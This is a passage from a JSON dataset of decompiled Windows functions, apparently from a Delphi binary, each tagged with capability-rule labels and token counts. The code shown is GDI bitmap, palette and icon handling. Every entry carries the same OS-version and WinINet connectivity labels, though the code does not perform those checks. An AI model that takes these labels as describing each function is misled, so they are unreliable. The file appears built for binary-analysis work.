0x429651);\n        return uVar1;\n    }\n    return 0;\n}\n",
        "token_count": 424
    },
    "0042965c": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nuint fcn.0042965c(void)\n\n{\n    char cVar1;\n    uint16_t uVar2;\n    int32_t in_EAX;\n    uint32_t uVar3;\n    uint uVar4;\n    uint uStack1080;\n    uint32_t uStack1076;\n    uint uStack1072;\n    uint32_t uStack1068;\n    uint uStack1064;\n    uint uStack1060;\n    uchar *puStack1056;\n    uint32_t uStack1052;\n    uint uStack1048;\n    uint uStack1044;\n    ushort uStack1040;\n    \n    uStack1040 = 0x300;\n    if (in_EAX == 0) {\n        uStack1044 = 0x4296bf;\n        fcn.004030ec();\n    }\n    else {\n        uStack1044 = 0;\n        uStack1048 = 0x42967a;\n        uVar3 = sub.gdi32.dll_CreateCompatibleDC();\n        puStack1056 = 0x429683;\n        uStack1052 = uVar3;\n        uVar4 = sub.gdi32.dll_SelectObject();\n        puStack1056 = &stack0xfffffbe8;\n        uStack1060 = 0x100;\n        uStack1064 = 0;\n        uStack1072 = 0x429697;\n        uStack1068 = uVar3;\n        uVar2 = sub.gdi32.dll_GetDIBColorTable();\n        uStack1068 = uStack1068 & 0xffff | uVar2 << 0x10;\n        uStack1080 = 0x4296a3;\n        uStack1076 = uVar3;\n        uStack1072 = uVar4;\n        sub.gdi32.dll_SelectObject();\n        uStack1080 = uVar3;\n        sub.gdi32.dll_DeleteDC();\n    }\n    if (uStack1080._2_2_ != 0) {\n        if ((uStack1080._2_2_ != 0x10) || (cVar1 = fcn.004295c4(),  cVar1 == '\\0')) {\n            fcn.00429458();\n        }\n        uVar4 = sub.gdi32.dll_CreatePalette(&stack0xfffffbc8);\n        return uVar4;\n    }\n    return 0;\n}\n",
        "token_count": 523
    },
    "00429700": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nulong fcn.00429700(void)\n\n{\n    int32_t in_EAX;\n    int32_t iVar1;\n    int32_t iStack44;\n    \n    if (((in_EAX != 0) && (iVar1 = sub.gdi32.dll_GetObjectA(),  iVar1 != 0)) && (in_EAX != 0)) {\n        sub.gdi32.dll_GetPaletteEntries();\n        fcn.00429458();\n        iStack44 = in_EAX;\n    }\n    return CONCAT44(iStack44, iStack44);\n}\n",
        "token_count": 118
    },
    "00429754": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00429754(uint arg_8h)\n\n{\n    int32_t in_EAX;\n    int32_t iVar1;\n    uint uVar2;\n    uint uVar3;\n    uint *in_EDX;\n    uint *in_FS_OFFSET;\n    uint uStack88;\n    uint uStack84;\n    uchar *puStack80;\n    int32_t iStack76;\n    uint uStack68;\n    int32_t iStack64;\n    uint uStack56;\n    uint uStack52;\n    uint uStack48;\n    uchar *puStack44;\n    uint uStack40;\n    uint lpbInit;\n    uint hdc;\n    uint var_ch;\n    uint var_8h;\n    uint lpbmih;\n    \n    *(in_EAX + 8) = *(in_EAX + 8) >> 1;\n    uStack40 = 0x429782;\n    iVar1 = fcn.004290f4();\n    *(in_EAX + 0x14) = iVar1 * *(in_EAX + 8);\n    uStack40 = 0x42979a;\n    iVar1 = fcn.004290d4();\n    uStack40 = 0;\n    puStack44 = 0x4297a3;\n    iStack76 = sub.user32.dll_GetDC();\n    if (iStack76 == 0) {\n        puStack44 = 0x4297b1;\n        fcn.00428e68();\n    }\n    uStack48 = 0x429901;\n    uStack52 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffcc;\n    iStack64 = in_EAX + 0x28 + iVar1 * 4;\n    uStack56 = 0;\n    uStack68 = 4;\n    puStack80 = 0x4297eb;\n    puStack44 = &stack0xfffffffc;\n    sub.gdi32.dll_CreateDIBitmap();\n    puStack80 = 0x4297f0;\n    uVar2 = fcn.00428f64();\n    uStack84 = 0x429827;\n    uStack88 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffa8;\n    puStack80 = &stack0xfffffffc;\n    uVar3 = fcn.00428f74();\n    *in_EDX = uVar3;\n    *in_FS_OFFSET = uStack88;\n    puStack80 = 0x42982e;\n    uStack88 = 0x429826;\n    uStack84 = uVar2;\n    sub.gdi32.dll_DeleteObject();\n    return;\n}\n",
        "token_count": 572
    },
    "004299b0": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.004299b0(uint32_t *arg_8h, uint32_t *arg_ch)\n\n{\n    int32_t *in_EAX;\n    uint32_t uVar1;\n    int32_t iVar2;\n    int32_t *in_FS_OFFSET;\n    int32_t iVar3;\n    int32_t iStack156;\n    uint uStack152;\n    uchar *puStack148;\n    uint uStack144;\n    int32_t iStack140;\n    uint uStack136;\n    uchar *puStack132;\n    uint hdc;\n    uint var_1ch;\n    uint var_14h;\n    uint var_10h;\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    puStack132 = 0x4299d6;\n    fcn.00402ed8();\n    uStack136 = 0x429ca9;\n    iStack140 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffff74;\n    uStack144 = 0x4299f5;\n    puStack132 = &stack0xfffffffc;\n    (**(*in_EAX + 0xc))();\n    if ((*arg_ch | arg_ch[1]) == 0) {\n        uStack144 = 0xb;\n        puStack148 = 0x429a03;\n        uVar1 = sub.user32.dll_GetSystemMetrics();\n        *arg_8h = uVar1;\n        puStack148 = 0xc;\n        uStack152 = 0x429a0f;\n        uVar1 = sub.user32.dll_GetSystemMetrics();\n        arg_8h[1] = uVar1;\n    }\n    else {\n        *arg_8h = *arg_ch;\n        arg_8h[1] = arg_ch[1];\n    }\n    uStack144 = 0;\n    puStack148 = 0x429a2b;\n    iVar2 = sub.user32.dll_GetDC();\n    if (iVar2 == 0) {\n        puStack148 = 0x429a39;\n        fcn.00428e68();\n    }\n    uStack152 = 0x429a99;\n    iStack156 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffff64;\n    puStack148 = &stack0xfffffffc;\n    sub.gdi32.dll_GetDeviceCaps(iVar2, 0xe);\n    iVar3 = iVar2;\n    sub.gdi32.dll_GetDeviceCaps(iVar2, 0xc);\n    *in_FS_OFFSET = iVar3;\n    sub.user32.dll_ReleaseDC(0, iVar2, 0x429aa0);\n    return;\n}\n",
        "token_count": 578
    },
    "00429cd4": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00429cd4(uint32_t param_1, uint32_t *param_2)\n\n{\n    int32_t iVar1;\n    uint32_t uVar2;\n    uint32_t *puVar3;\n    uint32_t *puVar4;\n    uchar auStack96 [4];\n    int16_t iStack92;\n    int16_t iStack90;\n    uint32_t auStack84 [18];\n    \n    auStack84[3] = 0;\n    iVar1 = sub.gdi32.dll_GetObjectA();\n    if (iVar1 == 0) {\n        fcn.00428e44();\n    }\n    else if ((iVar1 < 0x40) || (auStack84[0] < 0x28)) {\n        fcn.00403ae4();\n        *param_2 = 0x28;\n        param_2[1] = 0x54;\n        param_2[2] = auStack96;\n    }\n    else {\n        puVar3 = auStack84;\n        puVar4 = param_2;\n        for (iVar1 = 10; iVar1 != 0; iVar1 = iVar1 + -1) {\n            *puVar4 = *puVar3;\n            puVar3 = puVar3 + 1;\n            puVar4 = puVar4 + 1;\n        }\n    }\n    if (param_1 == 2) {\n        *(param_2 + 0xe) = 1;\n    }\n    else if (param_1 - 3 < 0xe) {\n        *(param_2 + 0xe) = 4;\n        param_2[8] = param_1;\n    }\n    else if (param_1 - 0x11 < 0xf0) {\n        *(param_2 + 0xe) = 8;\n        param_2[8] = param_1;\n    }\n    else {\n        *(param_2 + 0xe) = iStack90 * iStack92;\n    }\n    *(param_2 + 3) = 1;\n    if (param_2[8] < param_2[9]) {\n        param_2[9] = param_2[8];\n    }\n    if (param_2[5] == 0) {\n        iVar1 = fcn.004290f4();\n        uVar2 = param_2[2] >> 0x1f;\n        param_2[5] = iVar1 * ((param_2[2] ^ uVar2) - uVar2);\n    }\n    return;\n}\n",
        "token_count": 565
    },
    "00429e28": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_1h\n// WARNING: Could not reconcile some variable overlaps\n\nvoid __cdecl fcn.00429e28(uint arg_8h, uint arg_ch)\n\n{\n    uint uVar1;\n    int32_t iVar2;\n    int32_t in_ECX;\n    int32_t in_EDX;\n    uint *in_FS_OFFSET;\n    uint uVar3;\n    uint uVar4;\n    uint uStack44;\n    uint uStack40;\n    uchar *puStack36;\n    uint uStack32;\n    uint hdc;\n    int32_t hpal;\n    uint var_1h;\n    \n    uStack32 = 0x429e43;\n    fcn.00429cd4();\n    hpal = 0;\n    uStack32 = 0;\n    puStack36 = 0x429e4f;\n    uVar1 = sub.gdi32.dll_CreateCompatibleDC();\n    uStack40 = 0x429ec5;\n    uStack44 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffd4;\n    puStack36 = &fcn.00429e28::var_1h + 1;\n    if (in_EDX != 0) {\n        puStack36 = &fcn.00429e28::var_1h + 1;\n        hpal = sub.gdi32.dll_SelectPalette(uVar1);\n        sub.gdi32.dll_RealizePalette(uVar1);\n    }\n    uVar4 = *(in_ECX + 8);\n    uVar3 = uVar1;\n    iVar2 = sub.gdi32.dll_GetDIBits();\n    var_1h._0_1_ = iVar2 != 0;\n    *in_FS_OFFSET = uVar3;\n    if (hpal != 0) {\n        sub.gdi32.dll_SelectPalette(uVar1, hpal, 0, 0x429ecc, uVar4, arg_ch);\n    }\n    sub.gdi32.dll_DeleteDC(uVar1);\n    return;\n}\n",
        "token_count": 443
    },
    "00429f00": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_1h\n// WARNING: Could not reconcile some variable overlaps\n\nvoid __fastcall fcn.00429f00(uint param_1, uint param_2)\n\n{\n    int32_t *piVar1;\n    int32_t iVar2;\n    int32_t *in_EAX;\n    uint *in_FS_OFFSET;\n    uint uVar3;\n    uint uStack140;\n    uint uStack136;\n    uchar *puStack132;\n    uint uStack120;\n    uint uStack116;\n    uchar *puStack112;\n    uint uStack108;\n    uint *puStack104;\n    uint var_54h;\n    uint var_4ch;\n    uint var_48h;\n    uint piconinfo;\n    uint var_38h;\n    uint var_34h;\n    int32_t var_30h;\n    uint var_2ah;\n    ushort var_26h;\n    uint var_24h;\n    int32_t var_20h;\n    uint var_1ch;\n    uint var_18h;\n    int32_t var_14h;\n    int32_t var_10h;\n    int32_t var_ch;\n    uint var_8h;\n    uint var_1h;\n    \n    puStack104 = 0x429f1f;\n    fcn.00403ae4();\n    puStack104 = 0x429f2e;\n    fcn.00403ae4();\n    puStack104 = &fcn.00429f00::piconinfo;\n    puStack112 = 0x429f38;\n    uStack108 = param_2;\n    sub.user32.dll_GetIconInfo();\n    puStack112 = 0x429f3d;\n    fcn.00429ef4();\n    uStack116 = 0x42a0f0;\n    uStack120 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffff88;\n    puStack112 = &fcn.00429f00::var_1h + 1;\n    fcn.00429db8(2);\n    puStack132 = 0x429f6b;\n    fcn.00429db8(0xffffffff);\n    var_18h = 0;\n    var_1ch = 0;\n    var_20h = 0;\n    var_24h = 0;\n    uStack136 = 0x42a0c9;\n    uStack140 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffff74;\n    puStack132 = &fcn.00429f00::var_1h + 1;\n    var_18h = fcn.00402ed8();\n    var_1ch = fcn.00402ed8();\n    var_20h = fcn.00402ed8();\n    var_24h = fcn.00402ed8();\n    fcn.00429e28(2, var_1ch);\n    uVar3 = 0xffffffff;\n    fcn.00429e28(0xffffffff, var_24h);\n    if (var_1h != '\\0') {\n        var_30h = var_ch + 0x16 + var_14h + var_10h;\n        (**(*in_EAX + 0x10))();\n    }\n    var_2ah._2_2_ = 1;\n    var_26h = 1;\n    (**(*in_EAX + 0x10))();\n    iVar2 = var_20h;\n    (**(*in_EAX + 0x10))();\n    piVar1 = iVar2 + 8;\n    *piVar1 = *piVar1 + *(iVar2 + 8);\n    (**(*in_EAX + 0x10))();\n    (**(*in_EAX + 0x10))();\n    (**(*in_EAX + 0x10))();\n    *in_FS_OFFSET = uVar3;\n    fcn.00402f0c(0x42a0d0);\n    fcn.00402f0c();\n    fcn.00402f0c();\n    fcn.00402f0c();\n    return;\n}\n",
        "token_count": 907
    },
    "0042a138": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid fcn.0042a138(void)\n\n{\n    int32_t in_EAX;\n    \n    *(in_EAX + 0x20) = 1;\n    if (*(in_EAX + 0x12) != 0) {\n        (**(in_EAX + 0x10))();\n    }\n    return;\n}\n",
        "token_count": 72
    },
    "0042a150": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nuint32_t __cdecl fcn.0042a150(int32_t arg_8h)\n\n{\n    char cVar1;\n    uint32_t uVar2;\n    \n    if (*(*(arg_8h + -4) + 0x20) == 0) {\n        uVar2 = (**(**(arg_8h + -8) + 0x1c))();\n        return uVar2 ^ 1;\n    }\n    cVar1 = fcn.004047cc();\n    if ((cVar1 != '\\0') && (cVar1 = (**(**(arg_8h + -8) + 0x18))(),  cVar1 != '\\0')) {\n        return 0;\n    }\n    return 1;\n}\n",
        "token_count": 163
    },
    "0042a1f4": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_1h\n// WARNING: Could not reconcile some variable overlaps\n\nuint32_t __fastcall fcn.0042a1f4(uint param_1, int32_t *param_2)\n\n{\n    char cVar1;\n    int32_t *in_EAX;\n    int32_t iVar2;\n    int32_t iVar3;\n    uint *puVar4;\n    uint *puVar5;\n    uint32_t uVar6;\n    uint *in_FS_OFFSET;\n    ulong uVar7;\n    ulong uVar8;\n    uint uStack52;\n    uint uStack48;\n    uchar *puStack44;\n    uint uStack40;\n    uint uStack36;\n    uchar *puStack32;\n    uint var_ch;\n    uint var_8h;\n    uint var_1h;\n    \n    if (param_2 == NULL) {\ncode_r0x0042a219:\n        var_1h._0_1_ = 0;\n    }\n    else {\n        puStack32 = 0x42a20c;\n        iVar2 = fcn.00404518();\n        puStack32 = 0x42a215;\n        iVar3 = fcn.00404518();\n        if (iVar2 != iVar3) goto code_r0x0042a219;\n        var_1h._0_1_ = 1;\n    }\n    puStack32 = 0x42a229;\n    cVar1 = (**(*in_EAX + 0x1c))();\n    if (cVar1 == '\\0') {\n        puStack32 = 0x42a234;\n        cVar1 = (**(*param_2 + 0x1c))();\n        if (cVar1 == '\\0') {\n            if (var_1h != 0) {\n                puStack32 = 0x42a272;\n                puVar4 = fcn.00404610();\n                uStack36 = 0x42a32b;\n                uStack40 = *in_FS_OFFSET;\n                *in_FS_OFFSET = &stack0xffffffd8;\n                puStack44 = 0x42a28d;\n                puStack32 = &fcn.0042a1f4::var_1h + 1;\n                (**(*in_EAX + 0x44))();\n                puStack44 = 0x42a299;\n                puVar5 = fcn.00404610();\n                uStack48 = 0x42a30e;\n                uStack52 = *in_FS_OFFSET;\n                *in_FS_OFFSET = &stack0xffffffcc;\n                puStack44 = &fcn.0042a1f4::var_1h + 1;\n                (**(*param_2 + 0x44))();\n                uVar7 = (***puVar4)();\n                uVar8 = (***puVar5)();\n                if (uVar8 >> 0x20 == uVar7 >> 0x20 && uVar8 == uVar7) {\n                    (***puVar4)();\n                    cVar1 = fcn.00409850();\n                    if (cVar1 != '\\0') {\n                        var_1h._0_1_ = 1;\n                        goto code_r0x0042a2f5;\n                    }\n                }\n                var_1h._0_1_ = 0;\ncode_r0x0042a2f5:\n                *in_FS_OFFSET = uStack52;\n                puStack44 = 0x42a315;\n                uStack48 = 0x42a30d;\n                uVar6 = fcn.00404640();\n                return uVar6;\n            }\n            goto code_r0x0042a332;\n        }\n    }\n    puStack32 = 0x42a23f;\n    cVar1 = (**(*in_EAX + 0x1c))();\n    if (cVar1 != '\\0') {\n        puStack32 = 0x42a24a;\n        cVar1 = (**(*param_2 + 0x1c))();\n        if (cVar1 != '\\0') {\n            var_1h._0_1_ = 1;\n            goto code_r0x0042a332;\n        }\n    }\n    var_1h._0_1_ = 0;\ncode_r0x0042a332:\n    return var_1h;\n}\n",
        "token_count": 953
    },
    "0042a3a0": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0042a3a0(uint arg_8h, uint arg_ch, uint arg_10h, uint arg_14h)\n\n{\n    int32_t in_EAX;\n    \n    if (*(in_EAX + 0x1a) != 0) {\n        (**(in_EAX + 0x18))(arg_8h, arg_ch, arg_10h, arg_14h);\n    }\n    return;\n}\n",
        "token_count": 99
    },
    "0042a71c": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid fcn.0042a71c(void)\n\n{\n    int32_t in_EAX;\n    int32_t iVar1;\n    uint *in_FS_OFFSET;\n    uchar uVar2;\n    uint uStack292;\n    uint uStack288;\n    uchar *puStack284;\n    uint var_108h;\n    uint var_8h;\n    uint var_4h;\n    \n    puStack284 = &stack0xfffffffc;\n    uStack288 = 0x42a79a;\n    uStack292 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xfffffedc;\n    iVar1 = *(in_EAX + 8) + -1;\n    uVar2 = iVar1 == 0;\n    if (-1 < iVar1) {\n        do {\n            fcn.00419610();\n            fcn.00404520();\n            fcn.004056d0();\n            fcn.00405894();\n            if (uVar2) break;\n            iVar1 = iVar1 + -1;\n            uVar2 = iVar1 == -1;\n        } while (!uVar2);\n    }\n    *in_FS_OFFSET = uStack292;\n    puStack284 = 0x42a7a1;\n    uStack288 = 0x42a799;\n    fcn.0040546c();\n    return;\n}\n",
        "token_count": 290
    },
    "0042a7ac": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid fcn.0042a7ac(void)\n\n{\n    char cVar1;\n    int32_t in_EAX;\n    int32_t iVar2;\n    \n    iVar2 = *(in_EAX + 8) + -1;\n    if (-1 < iVar2) {\n        do {\n            fcn.00419610();\n            cVar1 = fcn.0040486c();\n            if (cVar1 != '\\0') {\n                fcn.0040635c();\n                fcn.00419504();\n            }\n            iVar2 = iVar2 + -1;\n        } while (iVar2 != -1);\n    }\n    return;\n}\n",
        "token_count": 140
    },
    "0042a96c": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nuint __fastcall fcn.0042a96c(uint param_1, int16_t param_2)\n\n{\n    int16_t iVar1;\n    int32_t in_EAX;\n    uint uVar2;\n    int32_t iVar3;\n    \n    iVar3 = *(*(in_EAX + 8) + 8) + -1;\n    if (-1 < iVar3) {\n        do {\n            iVar1 = fcn.00419610();\n            if (param_2 == iVar1) {\n                uVar2 = fcn.00419610();\n                return uVar2;\n            }\n            iVar3 = iVar3 + -1;\n        } while (iVar3 != -1);\n    }\n    return 0;\n}\n",
        "token_count": 157
    },
    "0042a9a8": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid fcn.0042a9a8(void)\n\n{\n    char cVar1;\n    int32_t in_EAX;\n    int32_t iVar2;\n    \n    iVar2 = *(*(in_EAX + 4) + 8) + -1;\n    if (-1 < iVar2) {\n        do {\n            fcn.00419610();\n            cVar1 = fcn.0040486c();\n            if (cVar1 != '\\0') {\n                fcn.00419504();\n                fcn.00419504();\n            }\n            iVar2 = iVar2 + -1;\n        } while (iVar2 != -1);\n    }\n    return;\n}\n",
        "token_count": 145
    },
    "0042a9f0": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nint32_t fcn.0042a9f0(void)\n\n{\n    if (*0x4a1fa0 == 0) {\n        *0x4a1fa0 = fcn.0042a508();\n    }\n    return *0x4a1fa0;\n}\n",
        "token_count": 63
    },
    "0042aa10": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nint32_t fcn.0042aa10(void)\n\n{\n    if (*0x4a1f9c == 0) {\n        *0x4a1f9c = fcn.0042a858();\n    }\n    return *0x4a1f9c;\n}\n",
        "token_count": 64
    },
    "0042ad78": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid fcn.0042ad78(void)\n\n{\n    if (*0x4a1fa0 != 0) {\n        fcn.0042a7ac();\n    }\n    if (*0x4a1f9c != 0) {\n        fcn.0042a9a8();\n    }\n    return;\n}\n",
        "token_count": 72
    },
    "0042adcc": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0042adcc(uint arg_8h, uint arg_ch, uint arg_10h, uint arg_14h)\n\n{\n    int32_t in_EAX;\n    \n    if (*(in_EAX + 0x22) != 0) {\n        (**(in_EAX + 0x20))(arg_8h, arg_ch, arg_10h, arg_14h);\n    }\n    return;\n}\n",
        "token_count": 96
    },
    "0042adf8": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.0042adf8(uint param_1, int32_t *param_2)\n\n{\n    int32_t in_EAX;\n    int32_t iVar1;\n    uint *in_FS_OFFSET;\n    uint uStack112;\n    uint uStack108;\n    int32_t *piStack104;\n    uint uStack100;\n    uint uStack96;\n    uchar *puStack92;\n    uint var_48h;\n    uint var_44h;\n    int32_t *var_4h;\n    \n    puStack92 = &stack0xfffffffc;\n    uStack96 = 0x42aefe;\n    uStack100 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffff9c;\n    piStack104 = 0x42ae27;\n    (**(*param_2 + 0xc))();\n    piStack104 = 0x42ae35;\n    (**(*param_2 + 0xc))();\n    piStack104 = 0x42ae40;\n    fcn.004056d0();\n    piStack104 = 0x42ae4d;\n    iVar1 = fcn.0042a71c();\n    var_4h = NULL;\n    if (iVar1 != 0) {\n        piStack104 = 0x42ae5b;\n        var_4h = (**(iVar1 + 0x48))();\n        uStack108 = 0x42ae80;\n        uStack112 = *in_FS_OFFSET;\n        *in_FS_OFFSET = &stack0xffffff90;\n        piStack104 = &stack0xfffffffc;\n        (**(*var_4h + 0x30))();\n        *in_FS_OFFSET = uStack112;\n    }\n    piStack104 = 0x42ae9f;\n    fcn.00404640();\n    *(in_EAX + 0xc) = var_4h;\n    if (var_4h != NULL) {\n        var_4h[5] = in_EAX;\n        piStack104 = var_4h;\n        uStack108 = 0x42aebd;\n        iVar1 = fcn.00404854();\n        piStack104[4] = iVar1;\n        var_4h[7] = in_EAX;\n        piStack104 = var_4h;\n        uStack108 = 0x42aed5;\n        iVar1 = fcn.00404854();\n        piStack104[6] = iVar1;\n    }\n    piStack104 = 0x42aee8;\n    fcn.0040483c();\n    *in_FS_OFFSET = uStack100;\n    puStack92 = 0x42af05;\n    uStack96 = 0x42aefd;\n    fcn.0040546c();\n    return;\n}\n",
        "token_count": 606
    },
    "0042af64": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nbool __cdecl fcn.0042af64(int32_t arg_8h)\n\n{\n    int32_t iVar1;\n    int32_t *piVar2;\n    char cVar3;\n    bool bVar4;\n    \n    iVar1 = *(*(arg_8h + -4) + 0x20);\n    if (iVar1 == 0) {\n        bVar4 = *(*(arg_8h + -8) + 0xc) != 0;\n    }\n    else {\n        bVar4 = true;\n        cVar3 = fcn.004047cc();\n        if (cVar3 != '\\0') {\n            if ((*(*(arg_8h + -8) + 0xc) == *(iVar1 + 0xc)) ||\n               (((piVar2 = *(*(arg_8h + -8) + 0xc),  piVar2 != NULL && (*(iVar1 + 0xc) != 0)) &&\n                (cVar3 = (**(*piVar2 + 0x18))(),  cVar3 != '\\0')))) {\n                bVar4 = false;\n            }\n            else {\n                bVar4 = true;\n            }\n        }\n    }\n    return bVar4;\n}\n",
        "token_count": 266
    },
    "0042b51c": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
